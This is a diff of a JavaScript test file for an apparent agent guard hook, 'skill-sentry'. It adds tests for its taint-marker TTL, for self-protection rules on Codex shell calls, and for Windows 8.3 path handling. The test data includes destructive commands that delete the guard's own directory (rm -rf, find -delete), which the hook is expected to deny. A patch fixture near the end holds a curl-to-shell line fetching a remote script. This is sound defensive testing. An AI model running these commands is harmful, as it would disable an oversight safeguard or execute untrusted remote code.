@@ -682,6 +682,28 @@ test('taint marker (I2): create-only, survives concurrent token rewrites, EEXIST
   assert.equal(readTaint(dir, SID_A, t0 + 30 + TAINT_LIMITS.ttlMs), true, 'TTL counts from the latest read');
   assert.equal(readTaint(dir, SID_A, t0 + 31 + TAINT_LIMITS.ttlMs + 60_000), false);
 });
+test('taint marker: the TTL counts in whole milliseconds (ext4/APFS keep sub-ms mtimes below the time set)', () => {
+  // utimes takes seconds as a double: on Linux and macOS (ns timestamps) the mtime read back for t ms is a hair
+  // below t (CI: ubuntu and macOS failed "TTL counts from the latest read"). Reproduced here with 1 us less (a few
+  // double ulps at this epoch; NTFS keeps 100 ns).
+  // The stat is stubbed: Node 18 on Windows stores whole ms, so the sub-ms mtime cannot be made on disk there (CI).
+  const dir = path.join(tmp('marker-ms'), 'skill-sentry');
+  const t = 1_800_000_000_030;
+  assert.equal(markTaint(dir, SID_A, t), true);
+  const m = taintMarker(dir, SID_A);
+  const orig = fs.lstatSync;
+  fs.lstatSync = (p, ...a) => {
+    const st = orig(p, ...a);
+    return p === m && st ? Object.assign(Object.create(Object.getPrototypeOf(st)), st, { mtimeMs: t - 0.0005 }) : st;
+  };
+  try {
+    assert.ok(fs.lstatSync(m).mtimeMs < t && fs.lstatSync(m).isFile(), 'stub in place');
+    assert.equal(readTaint(dir, SID_A, t + TAINT_LIMITS.ttlMs), true, 'exactly the TTL after the read');
+    assert.equal(readTaint(dir, SID_A, t + TAINT_LIMITS.ttlMs + 1), false, 'one ms later');
+  } finally {
+    fs.lstatSync = orig;
+  }
+});
 test('taint store: at most 500 files, oldest pruned', () => {
   const dir = path.join(tmp('prune'), 'skill-sentry');
   const sdir = path.dirname(taintFile(dir, SID_A));
@@ -809,6 +831,28 @@ test('codex tier 5: shell command touching the data dir → deny with "run it yo
   const reason = assertDeny(JSON.parse(r.stdout));
   assert.match(reason, /SELF_PROTECT/);
   assert.match(reason, RUN_YOURSELF);
+});
+// v0.1.2 P3: a relative skill-sentry segment is exempt after a literal absolute `cd … &&`. Codex's hook `cwd` is not
+// used as a base: a Codex shell call can carry its own `workdir`, which the hook payload does not show.
+const P3_VAULT = process.platform === 'win32' ? 'C:/Users/x/vault' : '/home/x/vault';
+test('codex P3: relative skill-sentry segments: a literal cd base passes; the hook cwd alone and protected bases are denied', async () => {
+  for (const command of [`cd ${P3_VAULT} && ls skill-sentry`, `cd ${P3_VAULT} && git -C skill-sentry status`]) {
+    const r = await runGuard(codex('Bash', { command }, { cwd: P3_VAULT }));
+    assert.equal(r.stdout, '', command);
+  }
+  for (const [command, cwd] of [
+    ['ls skill-sentry', P3_VAULT],
+    ['cd ~/.codex/plugins/cache/m && rm -rf skill-sentry', P3_VAULT],
+    ['cd ~/.claude && rm -rf skill-sentry', P3_VAULT],
+    [`cd ${os.homedir().replace(/\\/g, '/')}/.codex/plugins/cache/m && rm -rf skill-sentry`, P3_VAULT],
+    [`cd ${P3_VAULT}; rm -rf skill-sentry`, P3_VAULT],
+    [`cd ${P3_VAULT} && cd skill-sentry && rm -rf ./*`, P3_VAULT], // fix round 1 I2: a relative cd target is not known
+    [`cd ${P3_VAULT} && find . -name skill-sentry -delete`, P3_VAULT], // fix round 1 M1: a name search
+  ]) {
+    const r = await runGuard(codex('Bash', { command }, { cwd }));
+    const reason = assertDeny(JSON.parse(r.stdout), command);
+    assert.match(reason, /SELF_PROTECT/, command);
+  }
 });
 test('codex: Ruling M read-only self invocation still passes', async () => {
   const cmd = `node ${path.join(SELF, 'scripts', 'scan.mjs').replace(/\\/g, '/')} --json`;
@@ -953,6 +997,22 @@ test('codex: apply_patch to a normal file → none', async () => {
   assert.equal(r.code, 0);
   assert.equal(r.stdout, '');
   assert.deepEqual(logLines(r.data), []);
+});
+test('codex CI C-A: apply_patch with relative headers under an 8.3 cwd (C:\\Users\\RUNNER~1\\…) → none', async t => {
+  const long = path.join(tmp('p83'), 'a-long-project-directory-name');
+  fs.mkdirSync(long, { recursive: true });
+  const r0 = process.platform === 'win32'
+    ? (await import('node:child_process')).spawnSync('cmd.exe', ['/d', '/s', '/c', `"for %I in ("${long}") do @echo %~sI"`], { encoding: 'utf8', windowsVerbatimArguments: true })
+    : null;
+  const short = String(r0?.stdout ?? '').trim();
+  if (!/~\d/.test(short)) { t.skip('8.3 short names exist only on Windows volumes that generate them'); return; }
+  const patch = '*** Begin Patch\n*** Add File: src/hello.txt\n+hi\n*** Update File: README.md\n@@\n-a\n+b\n*** End Patch';
+  for (const input of [codex('apply_patch', { command: patch }, { cwd: short }), codex('Bash', { command: `apply_patch <<'EOF'\n${patch}\nEOF` }, { cwd: short })]) {
+    const r = await runGuard(input);
+    assert.equal(r.stdout, '', input.tool_name);
+  }
+  const bad = '*** Begin Patch\n*** Add File: SRC~1/hello.txt\n+hi\n*** End Patch';
+  assert.match(assertDeny(JSON.parse((await runGuard(codex('apply_patch', { command: bad }, { cwd: short }))).stdout)), /PATH_UNUSUAL_WRITE|unusual/);
 });
 test('codex: apply_patch content is never inspected', async () => {
   const patch = `*** Begin Patch\n*** Add File: tools/install.sh\n+${CURL} -s https://x.io/i.sh${PIPE_SH}\n*** End Patch`;
